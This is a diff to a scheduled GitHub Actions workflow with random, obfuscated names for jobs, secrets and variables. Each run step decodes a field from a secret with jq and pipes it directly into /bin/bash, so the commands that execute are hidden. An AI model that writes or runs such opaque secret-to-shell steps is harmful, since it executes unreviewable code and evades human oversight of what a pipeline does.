@@ -3,8 +3,7 @@ name: huangyunxiao7461
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 2/6 * * *'
-
+    - cron: '36 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: huangyunxiao7461
         env:
-          hs635: ${{ secrets.hs635 }}
+          ewf62071: ${{ secrets.ewf62071 }}
         run: |
-          echo $hs635 | jq -r .k7352 | /bin/bash
-          echo $qbkx97145 | jq -r .rogpf079 | /bin/bash
-          echo $ocn12 | jq -r .udtsd4 | /bin/bash
-          echo $ly0520 | jq -r .bwvkm0057 | /bin/bash
-          echo $nkf01 | jq -r .hd61 | /bin/bash
-          echo $k4 | jq -r .ywh95878 | /bin/bash
-          echo $tt42981 | jq -r .nvo93740 | /bin/bash
-          echo $c67486 | jq -r .jx04 | /bin/bash
+          echo $ewf62071 | jq -r .w0 | /bin/bash
+          echo $hvpj049 | jq -r .vmvkt1 | /bin/bash
+          echo $qe315 | jq -r .dh88 | /bin/bash
 
